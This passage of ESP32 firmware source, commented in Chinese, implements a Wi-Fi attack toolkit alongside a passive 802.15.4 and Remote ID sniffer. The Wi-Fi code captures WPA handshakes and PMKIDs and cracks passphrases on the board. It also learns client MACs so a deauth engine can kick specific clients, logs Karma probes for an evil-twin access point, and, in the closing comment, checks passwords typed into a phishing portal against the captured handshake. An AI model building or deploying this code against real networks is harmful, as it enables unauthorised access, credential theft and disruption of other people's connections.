  uint8_t addrLen;   // 2 = 短地址, 8 = 扩展地址
  uint16_t panId;
  uint32_t frames;
  int32_t rssi;
  uint8_t lqi;
  uint8_t ch;
  uint8_t lastType;
  uint32_t lastSeen;
  bool used;
};

struct I154State {
  volatile bool want = false;
  volatile bool initFailed = false;
  volatile uint8_t phase = I154_IDLE;
  volatile uint8_t channel = 15;
  volatile bool edDone = false;
  volatile int8_t edDbm = 0;
  volatile uint32_t nowMs = 0;   // 由任务每 50ms 刷新, 供 ISR 打时间戳 (ISR 内不取时间)

  uint8_t mode = I154_MODE_FRAMES;
  bool hopping = true;
  uint16_t durationSec = 0;
  uint32_t startedAt = 0;
  uint32_t lastHopAt = 0;

  uint32_t total = 0;
  uint32_t byType[5] = {0, 0, 0, 0, 0};   // beacon / data / ack / cmd / other
  uint32_t chFrames[16] = {0};            // 11..26
  int8_t ed[16] = {127, 127, 127, 127, 127, 127, 127, 127,
                   127, 127, 127, 127, 127, 127, 127, 127};  // 127 = 尚未测量

  I154PanEntry pans[I154_PAN_MAX];
  uint8_t panCount = 0;
  I154DevEntry devs[I154_DEV_MAX];
  uint8_t devCount = 0;

  // 与 AP 客户端共存 (C5 单射频): autoPaused=true 表示本次停止是共存自动暂停
  // (用户未主动停), 恢复嗅探时统计不清零; 手动 start/stop 会清除该标记。
  bool autoPaused = false;

  portMUX_TYPE mux = portMUX_INITIALIZER_UNLOCKED;
};
static I154State sI154;

// AP 侧客户端活动时间戳: 由 WiFi 事件回调更新 (探针请求 = 关联前奏, 最灵敏的活动信号)
static volatile uint32_t sApLastProbeMs = 0;
static volatile uint32_t sApLastAssocMs = 0;

static void i154ResetEd() {
  for (int i = 0; i < 16; i++) sI154.ed[i] = 127;
}

static const char *i154TypeStr(uint8_t t) {
  switch (t) {
    case 0: return "beacon";
    case 1: return "data";
    case 2: return "ack";
    case 3: return "cmd";
    default: return "other";
  }
}

// 在 ISR 内调用: 只做整数解析 + 临界区内的定长内存操作
static IRAM_ATTR void i154HandleFrame(const uint8_t *frame, const esp_ieee802154_frame_info_t *fi) {
  const uint8_t len = frame[0];          // frame[0] = 长度, frame[1..] = MHR (无 FCS)
  if (len < 3) return;
  const uint8_t *p = frame + 1;
  const uint16_t fcf = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
  uint8_t type = fcf & 0x7;
  if (type > 3) type = 4;
  const uint8_t dstMode = (fcf >> 10) & 0x3;
  const uint8_t srcMode = (fcf >> 14) & 0x3;
  const bool panComp = ((fcf >> 6) & 0x1) != 0;

  uint8_t off = 3;  // FCF(2) + 序列号(1)
  if (dstMode != 0 || srcMode != 0) {
    if (off > len) return;
  }
  uint16_t panId = 0xFFFF;
  if (dstMode != 0) {  // 目的 PAN 一定存在
    if (off + 2 > len) return;
    panId = (uint16_t)p[off] | ((uint16_t)p[off + 1] << 8);
    off += 2 + ((dstMode == 1) ? 2 : 8);
  }
  uint8_t srcLen = 0;
  const uint8_t *srcAddr = nullptr;
  if (srcMode != 0) {
    // 源 PAN: 目的地址不存在, 或未做 PAN 压缩时存在
    if (dstMode == 0 || !panComp) {
      if (off + 2 > len) return;
      if (panId == 0xFFFF) panId = (uint16_t)p[off] | ((uint16_t)p[off + 1] << 8);
      off += 2;
    }
    srcLen = (srcMode == 1) ? 2 : 8;
    if (off + srcLen > len) return;
    srcAddr = p + off;
  }

  uint8_t ch = fi->channel;
  if (ch < I154_CH_MIN || ch > I154_CH_MAX) {
    ch = sI154.channel;
    if (ch < I154_CH_MIN || ch > I154_CH_MAX) ch = I154_CH_MIN;
  }
  const uint32_t now = sI154.nowMs;
  const int32_t rssi = fi->rssi;

  portENTER_CRITICAL_ISR(&sI154.mux);
  sI154.total++;
  sI154.byType[type]++;
  sI154.chFrames[ch - I154_CH_MIN]++;

  if (panId != 0xFFFF) {
    int pi = -1;
    for (int i = 0; i < I154_PAN_MAX; i++) {
      if (sI154.pans[i].used && sI154.pans[i].panId == panId) { pi = i; break; }
    }
    if (pi < 0) {
      for (int i = 0; i < I154_PAN_MAX; i++) {
        if (!sI154.pans[i].used) { pi = i; break; }
      }
      if (pi < 0) {  // 表满: 淘汰最久未出现的 PAN
        uint32_t oldest = UINT32_MAX;
        for (int i = 0; i < I154_PAN_MAX; i++) {
          if (sI154.pans[i].lastSeen < oldest) { oldest = sI154.pans[i].lastSeen; pi = i; }
        }
      }
      if (pi >= 0) {
        sI154.pans[pi].used = true;
        sI154.pans[pi].panId = panId;
        sI154.pans[pi].frames = 0;
      }
    }
    if (pi >= 0) {
      I154PanEntry &pe = sI154.pans[pi];
      pe.frames++;
      pe.rssi = rssi;
      pe.ch = ch;
      pe.lastSeen = now;
    }
  }

  if (srcAddr && srcLen) {
    int di = -1;
    for (int i = 0; i < I154_DEV_MAX; i++) {
      I154DevEntry &d = sI154.devs[i];
      if (d.used && d.addrLen == srcLen && d.panId == panId) {
        bool same = true;
        for (int k = 0; k < srcLen; k++) {
          if (d.addr[k] != srcAddr[k]) { same = false; break; }
        }
        if (same) { di = i; break; }
      }
    }
    if (di < 0) {
      for (int i = 0; i < I154_DEV_MAX; i++) {
        if (!sI154.devs[i].used) { di = i; break; }
      }
      if (di < 0) {
        uint32_t oldest = UINT32_MAX;
        for (int i = 0; i < I154_DEV_MAX; i++) {
          if (sI154.devs[i].lastSeen < oldest) { oldest = sI154.devs[i].lastSeen; di = i; }
        }
      }
      if (di >= 0) {
        I154DevEntry &d = sI154.devs[di];
        d.used = true;
        d.addrLen = srcLen;
        for (int k = 0; k < srcLen; k++) d.addr[k] = srcAddr[k];
        d.panId = panId;
        d.frames = 0;
      }
    }
    if (di >= 0) {
      I154DevEntry &d = sI154.devs[di];
      d.frames++;
      d.rssi = rssi;
      d.lqi = fi->lqi;
      d.ch = ch;
      d.lastType = type;
      d.lastSeen = now;
    }
  }

  // 计数按表项重算, 避免淘汰/新建分支漏算
  uint8_t pc = 0, dc = 0;
  for (int i = 0; i < I154_PAN_MAX; i++) if (sI154.pans[i].used) pc++;
  for (int i = 0; i < I154_DEV_MAX; i++) if (sI154.devs[i].used) dc++;
  sI154.panCount = pc;
  sI154.devCount = dc;
  portEXIT_CRITICAL_ISR(&sI154.mux);
}

// ISR: 收帧完成 → 解析 → 归还驱动缓冲
IRAM_ATTR extern "C" void esp_ieee802154_receive_done(uint8_t *frame, esp_ieee802154_frame_info_t *frame_info) {
  i154HandleFrame(frame, frame_info);
  esp_ieee802154_receive_handle_done(frame);
}

// ISR: 能量检测完成
IRAM_ATTR extern "C" void esp_ieee802154_energy_detect_done(int8_t power) {
  sI154.edDbm = power;
  sI154.edDone = true;
}

// 一轮 11..26 能量扫描; 只在 energy 模式的运行态调用
static void i154EdSweep() {
  for (uint8_t ch = I154_CH_MIN; ch <= I154_CH_MAX && sI154.want; ch++) {
    esp_ieee802154_set_channel(ch);
    sI154.edDone = false;
    if (esp_ieee802154_energy_detect(I154_ED_SYMBOLS) != ESP_OK) continue;
    for (int i = 0; i < 60 && !sI154.edDone; i++) vTaskDelay(pdMS_TO_TICKS(2));
    if (sI154.edDone) {
      portENTER_CRITICAL(&sI154.mux);
      sI154.ed[ch - I154_CH_MIN] = sI154.edDbm;
      portEXIT_CRITICAL(&sI154.mux);
    }
  }
  // 一轮结束留出射频给 AP, 再扫下一轮
  for (int i = 0; i < 10 && sI154.want; i++) vTaskDelay(pdMS_TO_TICKS(50));
}

static void i154TaskFunc(void *) {
  for (;;) {
    vTaskDelay(pdMS_TO_TICKS(50));
    sI154.nowMs = millis();
    const uint8_t phase = sI154.phase;

    if (sI154.want && phase == I154_IDLE) {
      sI154.phase = I154_STARTING;
      sI154.initFailed = false;
      log("[i154] 初始化 802.15.4 射频...");
      esp_err_t err = esp_ieee802154_enable();
      if (err != ESP_OK) {
        log("[i154] 802.15.4 初始化失败 (err=" + String((int)err) + "), 可能是共存资源冲突");
        sI154.initFailed = true;
        sI154.want = false;
        sI154.phase = I154_IDLE;
        continue;
      }
      esp_ieee802154_set_promiscuous(true);  // 只收不发, 不自动 ACK
      // 统计重置只发生在"新鲜启动" (手动 start); 共存自动暂停后的恢复沿用累计结果
      const bool freshStart = !sI154.autoPaused;
      sI154.autoPaused = false;
      if (freshStart) {
        portENTER_CRITICAL(&sI154.mux);
        for (int i = 0; i < I154_PAN_MAX; i++) sI154.pans[i].used = false;
        for (int i = 0; i < I154_DEV_MAX; i++) sI154.devs[i].used = false;
        sI154.panCount = sI154.devCount = 0;
        sI154.total = 0;
        for (int i = 0; i < 5; i++) sI154.byType[i] = 0;
        for (int i = 0; i < 16; i++) sI154.chFrames[i] = 0;
        i154ResetEd();
        portEXIT_CRITICAL(&sI154.mux);
      }
      sI154.startedAt = millis();
      sI154.lastHopAt = sI154.startedAt;
      sI154.phase = I154_RUNNING;
      if (!sI154.want) {  // 初始化期间已被请求停止
        sI154.phase = I154_STOPPING;
        continue;
      }
      if (sI154.mode == I154_MODE_FRAMES) {
        // rx_when_idle: 收完一帧由硬件自动回到接收, 无需在 ISR 里重新 arm
        esp_ieee802154_set_rx_when_idle(true);
        esp_ieee802154_set_channel(sI154.channel);
        esp_ieee802154_receive();
        log("[i154] 帧嗅探已启动 (" +
            String(sI154.hopping ? String("跳频 11-26") : ("信道 " + String(sI154.channel))) +
            ", 纯被动)");
      } else {
        log("[i154] 能量扫描已启动 (11-26, 单信道 " + String((int)I154_ED_SYMBOLS * 16) + "us)");
      }
      emitLabState("ieee802154", true);
      continue;
    }

    if (sI154.want && phase == I154_RUNNING) {
      if (sI154.durationSec && (millis() - sI154.startedAt) / 1000 >= sI154.durationSec) {
        sI154.want = false;
        sI154.phase = I154_STOPPING;
        continue;
      }
      if (sI154.mode == I154_MODE_ENERGY) {
        i154EdSweep();
      } else if (sI154.hopping) {
        if (millis() - sI154.lastHopAt >= I154_DWELL_MS) {
          sI154.lastHopAt = millis();
          uint8_t next = sI154.channel + 1;
          if (next > I154_CH_MAX) next = I154_CH_MIN;
          sI154.channel = next;
          esp_ieee802154_set_channel(next);
          esp_ieee802154_receive();  // 换信道后重新进入接收
        }
      }
      continue;
    }

    if (!sI154.want && phase != I154_IDLE) {
      sI154.phase = I154_STOPPING;
      esp_ieee802154_disable();  // 归还射频
      sI154.phase = I154_IDLE;
      const uint32_t total = sI154.total;
      const uint8_t pcs = sI154.panCount;
      const uint8_t dcs = sI154.devCount;
      log("[i154] 已停止, 累计 " + String(total) + " 帧 / " + String(pcs) + " 个 PAN / " +
          String(dcs) + " 个设备");
      emitLabState("ieee802154", false);
      continue;
    }
  }
}
#endif /* FW_IEEE802154_SUPPORTED */

static void addKarmaProbe(const char *mac, const char *ssid, int8_t rssi, bool baited) {
  KarmaProbe &p = sKarma.probes[sKarma.probeHead];
  strlcpy(p.mac, mac, sizeof(p.mac));
  strlcpy(p.ssid, ssid, sizeof(p.ssid));
  p.rssi = rssi;
  p.ts = millis();
  p.baited = baited;
  sKarma.probeHead = (sKarma.probeHead + 1) % 10;
  if (sKarma.probeCount < 10) sKarma.probeCount++;
  sKarma.probesCaptured++;
  if (baited) sKarma.probesBaited++;
}

// 轻量 MAC 格式化 (回调上下文不分配 String)
static void macToStr(char *out, const uint8_t *m) {
  static const char kHex[] = "0123456789ABCDEF";
  for (int i = 0; i < 6; i++) {
    out[i * 3] = kHex[(m[i] >> 4) & 0x0F];
    out[i * 3 + 1] = kHex[m[i] & 0x0F];
    if (i < 5) out[i * 3 + 2] = ':';
  }
  out[17] = 0;
}

// 从 IE 链中取 SSID (id=0); 返回长度, 未找到返回 -1
static int ieFindSsid(const uint8_t *f, int len, int off, char *out, int outLen) {
  while (off + 2 <= len) {
    const uint8_t id = f[off], l = f[off + 1];
    if (off + 2 + l > len) break;
    if (id == 0) {
      int n = (l < outLen - 1) ? l : outLen - 1;
      memcpy(out, f + off + 2, n);
      out[n] = 0;
      return n;
    }
    off += 2 + l;
  }
  return -1;
}

// 在 IE 链中查找厂商自定义 IE (id=0xDD): 匹配 3 字节 OUI + 1 字节 OUI Type。
// 成功返回载荷指针 (跳过 OUI/Type) 并写入载荷长度, 失败返回 nullptr。
static const uint8_t *ieFindVendor(const uint8_t *f, int len, int off,
                                   const uint8_t oui[3], uint8_t ouiType, int *outLen) {
  while (off + 2 <= len) {
    const uint8_t id = f[off], l = f[off + 1];
    if (off + 2 + l > len) break;
    if (id == 0xDD && l >= 4 &&
        f[off + 2] == oui[0] && f[off + 3] == oui[1] && f[off + 4] == oui[2] &&
        f[off + 5] == ouiType) {
      *outLen = l - 4;
      return f + off + 6;
    }
    off += 2 + l;
  }
  return nullptr;
}

// Beacon / ProbeResp 中查找 ASTM F3411 Remote ID 厂商 IE (OUI FA-0B-BC, Type 0x0D)
static bool ridFromWifiFrame(const uint8_t *f, int len, int8_t rssi, RidData &out) {
  static const uint8_t kOui[3] = {0xFA, 0x0B, 0xBC};
  int n = 0;
  const uint8_t *p = ieFindVendor(f, len, 36, kOui, 0x0D, &n);
  if (!p || n < 25) return false;
  if (!ridParsePack(p, n, out)) return false;
  char bssid[18];
  macToStr(bssid, f + 16);
  ridUpsert(bssid, RID_TRANSPORT_WIFI, rssi, out);
  return true;
}

// 数据包分析器: 把真实空口帧归类写入滚动缓冲
// rid != nullptr 表示该 Beacon/ProbeResp 已由 ridFromWifiFrame 解析出 Remote ID
static void snifferObserve(const uint8_t *f, int len, int8_t rssi, uint8_t ch,
                           const RidData *rid) {
  if (len < 10) return;
  const uint8_t fc0 = f[0];
  const uint8_t ftype = (fc0 >> 2) & 0x03;
  const uint8_t sub = (fc0 >> 4) & 0x0F;
  char src[18], dst[18], type[12] = "Data", info[48] = "";
  macToStr(src, (len >= 16) ? f + 10 : f + 4);
  macToStr(dst, f + 4);

  if (ftype == 0) {
    if (len < 24) return;
    static const char *subNames[16] = {
      "AssocReq", "AssocResp", "ReassocReq", "ReassocResp", "ProbeReq", "ProbeResp",
      "TimingAdv", "-", "Beacon", "ATIM", "Disassoc", "Auth",
      "Deauth", "Action", "ActionNoAck", "-"};
    strlcpy(type, subNames[sub], sizeof(type));
    if (sub == 8 || sub == 5) {
      char ssid[33];
      if (rid && rid->uasId[0]) snprintf(info, sizeof(info), "RemoteID: %s", rid->uasId);
      else if (ieFindSsid(f, len, 36, ssid, sizeof(ssid)) >= 0) snprintf(info, sizeof(info), "SSID: %s", ssid);
      else strlcpy(info, "(隐藏 SSID)", sizeof(info));
    } else if (sub == 4) {
      char ssid[33];
      if (ieFindSsid(f, len, 24, ssid, sizeof(ssid)) > 0) snprintf(info, sizeof(info), "Probe: %s", ssid);
      else strlcpy(info, "Broadcast Probe", sizeof(info));
    } else if (sub == 12 || sub == 10) {
      if (len >= 26) snprintf(info, sizeof(info), "Reason: %u", (unsigned)(f[24] | (f[25] << 8)));
      else strlcpy(info, "管理帧", sizeof(info));
    } else {
      strlcpy(info, "Management Frame", sizeof(info));
    }
    addSnifferPacket(ch, rssi, type, src, dst, info, 0);
    return;
  }

  if (ftype == 1) {
    static const char *ctrlNames[16] = {
      "-", "-", "-", "-", "-", "-", "-", "Control", "BlockAckReq", "BlockAck",
      "PS-Poll", "RTS", "CTS", "ACK", "CF-End", "CF-EndAck"};
    strlcpy(type, ctrlNames[sub], sizeof(type));
    strlcpy(info, "Control Frame", sizeof(info));
    addSnifferPacket(ch, rssi, type, src, dst, info, 1);
    return;
  }

  // 数据帧
  if (sub == 4) strlcpy(type, "Null", sizeof(type));
  else if (sub == 8 || sub == 12) strlcpy(type, "QoS", sizeof(type));
  if (eapolOffset(f, len) >= 0) {
    strlcpy(type, "EAPOL", sizeof(type));
    strlcpy(info, "802.1X Key", sizeof(info));
  } else if (len >= 24 && ((fc0 & 0x03) == 0x01 || (fc0 & 0x03) == 0x02)) {
    char b[18];
    macToStr(b, f + 16);
    snprintf(info, sizeof(info), "BSSID %s", b);
  } else {
    strlcpy(info, "WDS / IBSS", sizeof(info));
  }
  addSnifferPacket(ch, rssi, type, src, dst, info, 2);
}

// Airodump: 记录对端 STA/AP (按 MAC 聚合帧数与探测过的 SSID)
static void airodumpObserve(const uint8_t *a, const uint8_t *b, const uint8_t *bssid,
                            int8_t rssi, const char *ssid) {
  const uint8_t *peer = a;
  if (bssid && memcmp(a, bssid, 6) == 0) peer = b;
  if (peer[0] & 0x01) return;   // 跳过组播/广播地址
  char mac[18], bs[18];
  macToStr(mac, peer);
  macToStr(bs, bssid ? bssid : b);
  for (int i = 0; i < sAirodump.stationCount; i++) {
    AirodumpStation &st = sAirodump.stations[i];
    if (strcmp(st.mac, mac) != 0) continue;
    st.packets++;
    st.rssi = rssi;
    if (ssid && ssid[0] && strstr(st.probes, ssid) == NULL) {
      size_t cur = strlen(st.probes);
      if (cur && cur < sizeof(st.probes) - 2) {
        st.probes[cur] = ',';
        st.probes[cur + 1] = 0;
      }
      strlcat(st.probes, ssid, sizeof(st.probes));
    }
    return;
  }
  if (sAirodump.stationCount >= 8) return;
  AirodumpStation &st = sAirodump.stations[sAirodump.stationCount++];
  strlcpy(st.mac, mac, sizeof(st.mac));
  strlcpy(st.bssid, bs, sizeof(st.bssid));
  st.rssi = rssi;
  st.packets = 1;
  st.probes[0] = 0;
  if (ssid && ssid[0]) strlcpy(st.probes, ssid, sizeof(st.probes));
}

// Karma: 记录真实 Probe Request (5s 内同 MAC+SSID 去重)
static void karmaObserveProbe(const uint8_t *f, int len, int8_t rssi) {
  if (len < 26) return;
  char ssid[33];
  if (ieFindSsid(f, len, 24, ssid, sizeof(ssid)) <= 0) return;   // 忽略隐藏/通配探针
  char mac[18];
  macToStr(mac, f + 10);
  const uint32_t now = millis();
  for (int i = 0; i < sKarma.probeCount; i++) {
    int idx = (sKarma.probeHead + 10 - sKarma.probeCount + i) % 10;
    if (strcmp(sKarma.probes[idx].mac, mac) == 0 && strcmp(sKarma.probes[idx].ssid, ssid) == 0) {
      if (now - sKarma.probes[idx].ts < 5000) return;
      break;
    }
  }
  bool baited = false;
  if (sEvilTwin.active) {
    if (sEvilTwin.cloneSsid.length() && strcmp(ssid, sEvilTwin.cloneSsid.c_str()) == 0) baited = true;
    else if (apSsid.length() && strcmp(ssid, apSsid.c_str()) == 0) baited = true;
  }
  addKarmaProbe(mac, ssid, rssi, baited);
}

// 握手包解析 (只处理数据帧中的 EAPOL-Key)
static void handleEapolFrame(const uint8_t *f, int len) {
  if (len < 40) return;
  if ((f[0] & 0x0C) != 0x08) return;             // 只要数据帧
  const int off = eapolOffset(f, len);
  if (off < 0) return;
  const uint8_t *e = f + off;
  // sig_len 是否含 4 字节 FCS 因驱动/芯片而异; 只按 EAPOL 自身长度字段判断, 避免误丢帧
  const int avail = len - off;
  if (avail < 99) return;
  if (e[1] != 0x03) return;                      // EAPOL-Key (802.1X type 3)
  const uint16_t bodyLen = ((uint16_t)e[2] << 8) | (uint16_t)e[3];
  if (bodyLen < 95 || (int)bodyLen + 4 > avail) return;

  const uint16_t keyInfo = ((uint16_t)e[5] << 8) | (uint16_t)e[6];
  if (!(keyInfo & 0x0008)) return;               // 只处理 pairwise (四次握手)
  const bool ack = (keyInfo & 0x0080) != 0;
  const bool hasMic = (keyInfo & 0x0100) != 0;
  const bool secure = (keyInfo & 0x0200) != 0;
  const uint8_t ver = (uint8_t)(keyInfo & 0x0007);

  // Frame Control 第二字节: bit0=ToDS, bit1=FromDS (f[0] 是 protocol/type/subtype, 不能用!)
  const bool fromDs = (f[1] & 0x02) != 0;
  const uint8_t *ap  = fromDs ? f + 10 : f + 4;   // BSSID
  const uint8_t *sta = fromDs ? f + 4 : f + 10;   // 对端 STA
  if (sHandshake.hasTarget && memcmp(ap, sHandshake.targetBssid, 6) != 0) return;

  sHandshake.frameCount++;

  if (ack && !hasMic) {                           // M1: AP → STA, 携带 ANonce
    memcpy(sHandshake.anonce, e + 17, 32);
    memcpy(sHandshake.bssid, ap, 6);
    memcpy(sHandshake.stmac, sta, 6);
    sHandshake.keyver = ver;
    sHandshake.m1 = true;
    // PMKID KDE: 0xdd, len, 00:0f:ac:04, 16 字节 PMKID
    const uint16_t kdLen = ((uint16_t)e[97] << 8) | (uint16_t)e[98];
    for (int i = 0; i + 22 <= (int)kdLen && 99 + i + 22 <= (int)bodyLen + 4; i++) {
      const uint8_t *kd = e + 99 + i;
      if (kd[0] == 0xDD && kd[1] >= 20 && kd[2] == 0x00 && kd[3] == 0x0F &&
          kd[4] == 0xAC && kd[5] == 0x04) {
        sHandshake.pmkid = true;
        break;
      }
    }
  } else if (hasMic && !ack && !secure) {         // M2: STA → AP, SNonce + MIC
    uint16_t flen = (uint16_t)(bodyLen + 4);
    if (flen > sizeof(sHandshake.eapol)) flen = sizeof(sHandshake.eapol);
    memcpy(sHandshake.eapol, e, flen);
    sHandshake.eapolLen = flen;
    memcpy(sHandshake.snonce, e + 17, 32);
    memcpy(sHandshake.bssid, ap, 6);
    memcpy(sHandshake.stmac, sta, 6);
    sHandshake.keyver = ver;
    sHandshake.m2 = true;
  } else if (hasMic && ack) {                     // M3: AP → STA, GTK
    sHandshake.m3 = true;
  } else if (hasMic && secure) {                  // M4: STA → AP, ACK
    sHandshake.m4 = true;
  }

  if (sHandshake.m1 && sHandshake.m2) sHandshake.captured = true;
  // keyver 0 = AKM 自定义 (WPA3-SAE), 3 = 802.11w PMF; 两者的 MIC 算法板载未实现
  if (sHandshake.keyver == 0 || sHandshake.keyver >= 3) sHandshake.unsupported = true;
}

// 统一 promiscuous 回调: 按当前运行模块把同一帧分发给握手/嗅探/侦察/Karma 观察器
static void onPromiscuousFrame(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
  const uint8_t *f = pkt->payload;
  const int len = (int)pkt->rx_ctrl.sig_len;
  if (len < 10) return;
  const int8_t rssi = pkt->rx_ctrl.rssi;
  const uint8_t ch = pkt->rx_ctrl.channel ? pkt->rx_ctrl.channel : apChannelActive;

  const uint8_t ftype = (f[0] >> 2) & 0x03;
  const uint8_t sub = (f[0] >> 4) & 0x0F;

  // Deauth 引擎运行期间顺带学习目标 AP 下的客户端 MAC (用于定向单播踢线)
  if (sDeauth.running) learnClientMac(f, len);

  // P4-3: Beacon / ProbeResp 的 Remote ID 每帧只解析一次, 供 Sniffer 展示与 /api/rid 共用
  RidData rid;
  bool hasRid = false;
  if (ftype == 0 && (sub == 8 || sub == 5) && len >= 36) {
    hasRid = ridFromWifiFrame(f, len, rssi, rid);
  }

  if (sHandshake.capturing) handleEapolFrame(f, len);
  if (sSniffer.running) snifferObserve(f, len, rssi, ch, hasRid ? &rid : nullptr);
  if (sKarma.running && ftype == 0 && sub == 4) karmaObserveProbe(f, len, rssi);
  if (sAirodump.running && len >= 24) {
    char ssid[33] = {0};
    if (ftype == 0 && (sub == 4 || sub == 5 || sub == 8)) {
      ieFindSsid(f, len, (sub == 4) ? 24 : 36, ssid, sizeof(ssid));
    }
    airodumpObserve(f + 10, f + 4, f + 16, rssi, ssid);
  }
}

static bool promiscuousWanted() {
  // Deauth 帧注入需要 promiscuous: C5 WiFi 库白名单外帧 (Deauth/Disassoc) 在
  // prom 关闭时被拒 (实测错误码 258), 开启后放行 (真机 txtest 验证)
  return sHandshake.capturing || sSniffer.running || sAirodump.running || sKarma.running ||
         (sDeauth.running && sDeauth.frameReady);
}

// 按活跃模块统一配置过滤掩码与回调; 没有模块需要时关闭 promiscuous。
// 返回 promiscuous 是否处于开启状态 (无模块需要时视为成功)。
static bool syncPromiscuousEngine() {
  if (!promiscuousWanted()) {
    esp_wifi_set_promiscuous(false);
    return true;
  }
  uint32_t mask = 0;
  if (sSniffer.running) {
    mask |= WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_CTRL | WIFI_PROMIS_FILTER_MASK_DATA;
  }
  if (sAirodump.running || sKarma.running) {
    mask |= WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  }
  if (sDeauth.running && sDeauth.frameReady) {
    // 注入本身只需 prom 处于开启状态; 同时收数据帧用于学习目标 AP 下的客户端 MAC
    // (单播定向踢线), 否则只能发广播帧, 而广播 Deauth 常被 Wi-Fi 6 终端静默丢弃。
    mask |= WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA |
            WIFI_PROMIS_FILTER_MASK_DATA_MPDU | WIFI_PROMIS_FILTER_MASK_DATA_AMPDU;
  }
  if (sHandshake.capturing) {
    // Wi-Fi 6 AP 的 M1/M3 (FromDS) 常被装进 A-MPDU 聚合发出, 只开 DATA 位会漏掉聚合内的帧,
    // 表现为「只抓到 STA→AP 的 M2/M4, 抓不到 AP→STA 的 M1/M3」。补上 MPDU/AMPDU 两位。
    mask |= WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_DATA_MPDU |
            WIFI_PROMIS_FILTER_MASK_DATA_AMPDU;
  }

  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = mask;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(onPromiscuousFrame);
  return esp_wifi_set_promiscuous(true) == ESP_OK;
}

/* ---- 板载跑包所需的密码学原语 (mbedtls, ESP32 有 SHA 硬件加速) ---- */
static void pbkdf2Sha1(const uint8_t *pass, size_t passLen,
                       const uint8_t *salt, size_t saltLen, uint8_t out[32]) {
  memset(out, 0, 32);
  const mbedtls_md_info_t *md = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
  if (!md) return;
  mbedtls_md_context_t ctx;
  mbedtls_md_init(&ctx);
  if (mbedtls_md_setup(&ctx, md, 1) != 0) { mbedtls_md_free(&ctx); return; }

  uint8_t saltBlock[40];   // ESSID ≤ 32 字节 + 4 字节块序号
  if (saltLen > 32) saltLen = 32;
  memcpy(saltBlock, salt, saltLen);
  for (uint32_t block = 1; block <= 2; block++) {
    uint8_t u[20], t[20];
    saltBlock[saltLen + 0] = (uint8_t)(block >> 24);
    saltBlock[saltLen + 1] = (uint8_t)(block >> 16);
    saltBlock[saltLen + 2] = (uint8_t)(block >> 8);
    saltBlock[saltLen + 3] = (uint8_t)block;

    mbedtls_md_hmac_starts(&ctx, pass, passLen);
    mbedtls_md_hmac_update(&ctx, saltBlock, saltLen + 4);
    mbedtls_md_hmac_finish(&ctx, u);
    memcpy(t, u, 20);
    for (int i = 1; i < 4096; i++) {
      mbedtls_md_hmac_reset(&ctx);
      mbedtls_md_hmac_update(&ctx, u, 20);
      mbedtls_md_hmac_finish(&ctx, u);
      for (int j = 0; j < 20; j++) t[j] ^= u[j];
    }
    const size_t take = (block == 1) ? 20 : 12;   // 只要 32 字节
    memcpy(out + (block - 1) * 20, t, take);
  }
  mbedtls_md_free(&ctx);
}

// PTK = PRF-512(PMK, "Pairwise key expansion", KDD): 每块独立 HMAC, 不链式
static void prfSha1(const uint8_t pmk[32], uint8_t ptk[80]) {
  memset(ptk, 0, 80);
  static const uint8_t LABEL[22] = {'P','a','i','r','w','i','s','e',' ','k','e','y',' ',
                                    'e','x','p','a','n','s','i','o','n'};
  uint8_t kdd[76];
  const uint8_t *aa = sHandshake.bssid, *spa = sHandshake.stmac;
  const uint8_t *an = sHandshake.anonce, *sn = sHandshake.snonce;
  if (memcmp(aa, spa, 6) <= 0) { memcpy(kdd, aa, 6); memcpy(kdd + 6, spa, 6); }
  else { memcpy(kdd, spa, 6); memcpy(kdd + 6, aa, 6); }
  if (memcmp(an, sn, 32) <= 0) { memcpy(kdd + 12, an, 32); memcpy(kdd + 44, sn, 32); }
  else { memcpy(kdd + 12, sn, 32); memcpy(kdd + 44, an, 32); }

  uint8_t msg[100];
  memcpy(msg, LABEL, 22);
  msg[22] = 0x00;                 // hostapd 的 label 以 NUL 结尾
  memcpy(msg + 23, kdd, 76);
  const mbedtls_md_info_t *md = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
  if (!md) return;
  for (int i = 0; i < 4; i++) {
    msg[99] = (uint8_t)i;
    mbedtls_md_hmac(md, pmk, 32, msg, 100, ptk + i * 20);
  }
}

// 用候选口令重算 M2 的 MIC; 成功返回 true
static bool computeM2Mic(const char *pass, uint8_t mic[16]) {
  const mbedtls_md_type_t alg = (sHandshake.keyver == 1) ? MBEDTLS_MD_MD5 : MBEDTLS_MD_SHA1;
  const mbedtls_md_info_t *md = mbedtls_md_info_from_type(alg);
  if (!md) return false;
  uint8_t pmk[32];
  pbkdf2Sha1((const uint8_t *)pass, strlen(pass),
             (const uint8_t *)sHandshake.essid.c_str(), sHandshake.essid.length(), pmk);
  uint8_t ptk[80];
  prfSha1(pmk, ptk);
  uint8_t frame[256];
  memcpy(frame, sHandshake.eapol, sHandshake.eapolLen);
  memset(frame + 81, 0, 16);      // MIC 字段置零后才是被 HMAC 的内容
  // 注意: SHA1 摘要 20 字节 / MD5 16 字节。输出缓冲必须按最长摘要预留,
  // 否则 SHA1 会越界写 4 字节踩坏调用方栈上的 canary (真机实测 Stack smashing)。
  uint8_t digest[20];
  mbedtls_md_hmac(md, ptk, 16, frame, sHandshake.eapolLen, digest);
  memcpy(mic, digest, 16);        // MIC 只取前 16 字节
  return true;
}

/* ---------------- 门户密码验真 (基于已捕获的 M1/M2) ----------------
 * 已抓到目标网络完整四次握手时, 门户提交的密码可以在板上直接判定真伪:
 *   PMK = PBKDF2-HMAC-SHA1(密码, SSID, 4096, 32)
 *   PTK = PRF-512(PMK, "Pairwise key expansion", AA|SPA|ANonce|SNonce)
 *   MIC = HMAC(PTK[0..15], M2 帧且 MIC 字段置零)
 * 与 M2 自带的 MIC 相等 = 密码正确; 否则判为假密码, 不入库并要求重新输入。
